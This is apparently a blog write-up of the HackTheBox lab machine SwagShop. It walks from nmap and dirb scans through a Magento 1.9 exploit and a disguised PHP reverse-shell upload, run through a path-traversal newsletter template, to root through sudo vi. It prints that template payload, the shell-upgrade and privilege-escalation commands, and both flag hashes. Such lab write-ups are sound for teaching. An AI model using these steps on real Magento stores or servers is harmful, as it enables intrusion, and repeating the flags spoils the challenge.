---
title: "HackTheBox SwagShop Quick Writeup"
subtitle: "A box I owned on HackTheBox"
date: 2019-09-07T13:12:14-04:00
lastmod: 2020-05-29T13:12:14-04:00
draft: false
author: "Nathan Higley"
authorLink: ""
description: ""

tags: [writeup, hackthebox, hacking]
categories: [HackTheBox, Security]

hiddenFromHomePage: false
hiddenFromSearch: false

featuredImage: ""
featuredImagePreview: ""

toc:
  enable: true
math:
  enable: false
lightgallery: false
license: ""
---

# SwagShop

Machine IP: 10.10.10.140

### Enumeration

#### Nmap Scan

```
nmap -T4 -p- 10.10.10.140

Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-07 15:07 EDT
Nmap scan report for 10.10.10.140
Host is up (0.091s latency).
Not shown: 65525 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
1039/tcp  filtered sbl
2525/tcp  filtered ms-v-worlds
5232/tcp  filtered sgi-dgl
26255/tcp filtered unknown
47037/tcp filtered unknown
48924/tcp filtered unknown
51397/tcp filtered unknown
62470/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 888.99 seconds
```
```
nmap -T4 -A -p22,80,1039,2525,5232,26255,47037,48924,51397,62470 10.10.10.140 

Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-07 15:23 EDT
Nmap scan report for 10.10.10.140
Host is up (0.049s latency).

PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp    open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
1039/tcp  closed sbl
2525/tcp  closed ms-v-worlds
5232/tcp  closed sgi-dgl
26255/tcp closed unknown
47037/tcp closed unknown
48924/tcp closed unknown
51397/tcp closed unknown
62470/tcp closed unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=9/7%OT=22%CT=1039%CU=44622%PV=Y%DS=2%DC=T%G=Y%TM=5D740
OS:3DA%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)O
OS:PS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DS
OS:T11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)E
OS:CN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1039/tcp)
HOP RTT      ADDRESS
1   48.38 ms 10.10.14.1
2   48.51 ms 10.10.10.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.57 seconds
```


#### Dirb
```
dirb http://10.10.10.140

---- Scanning URL: http://10.10.10.140/ ----
==> DIRECTORY: http://10.10.10.140/app/                                        
==> DIRECTORY: http://10.10.10.140/errors/                                     
+ http://10.10.10.140/favicon.ico (CODE:200|SIZE:1150)                         
==> DIRECTORY: http://10.10.10.140/includes/                                   
+ http://10.10.10.140/index.php (CODE:200|SIZE:16097)                          
==> DIRECTORY: http://10.10.10.140/js/                                         
==> DIRECTORY: http://10.10.10.140/lib/                                        
==> DIRECTORY: http://10.10.10.140/media/                                      
==> DIRECTORY: http://10.10.10.140/pkginfo/                                    
+ http://10.10.10.140/server-status (CODE:403|SIZE:300)                        
==> DIRECTORY: http://10.10.10.140/shell/                                      
==> DIRECTORY: http://10.10.10.140/skin/                                       
==> DIRECTORY: http://10.10.10.140/var/                                        
                                                                               
---- Entering directory: http://10.10.10.140/app/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/errors/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/js/ ----
==> DIRECTORY: http://10.10.10.140/js/calendar/                                
==> DIRECTORY: http://10.10.10.140/js/flash/                                   
==> DIRECTORY: http://10.10.10.140/js/lib/                                     
==> DIRECTORY: http://10.10.10.140/js/tiny_mce/                                
                                                                               
---- Entering directory: http://10.10.10.140/lib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/media/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/pkginfo/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/shell/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/skin/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/var/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/js/calendar/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/js/flash/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/js/lib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.140/js/tiny_mce/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Sep  7 15:29:47 2019
DOWNLOADED: 9224 - FOUND: 3

```

Found in /var/package/Interface_Adminhtml_Default-1.9.0.0.xml that the Magento version is 1.9 which is vulnerable to SQL injection.

Found exploit code at [Magento eCommerce - Remote Code Execution - XML webapps Exploit](https://www.exploit-db.com/exploits/37977).

Code worked with some modifications, dropping us with admin credentials:
```
user: groot
pass: yeet
```

Within the admin app for Magento, I was able to use the following attack named Froghopper:
[Anatomy Of A Magento Attack: Froghopper](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper)

To execute the attack, I needed to upload a php file that would give me a shell, but to upload it, I had to make the file extension .jpg.  Then upload it as a new category image.
[php-reverse-shell \| pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

Then using the "Newsletter" feature of magento, I used the following code, and then previewed it to execute the php script 
```
{{block type='core/template' template='../../../../../../media/catalog/category/<filename>.jpg}}
```

### Got User
I got a shell from this and was able to read the user hash as user www-data.
```
cat /home/haris/user.txt

a448877277e82f05e5ddf9f90aefbac8
```

Now to see how I can do privilege escalation:
```
sudo -l

Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
sudo /usr/bin/vi /var/www/html/*
```

Since I need to run vi in a tty and my reverse shell did not run, I had to get a proper tty via the following command:

``` 
/usr/bin/python3 -c "import pty;pty.spawn('/bin/sh');" 
```

Now I can run vi as sudo:
```
sudo /usr/bin/vi /var/www/html/**
```

This opens vi, and then entering the following in the vi command line gives me a root shell:
```
:sh
```

### Got Root

And I am in fact root:
```
whoami

root
```

And now we can read the root hash:
```
cat /root/root.txt

c2b087d66e14a652a3b86a130ac56721

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
```
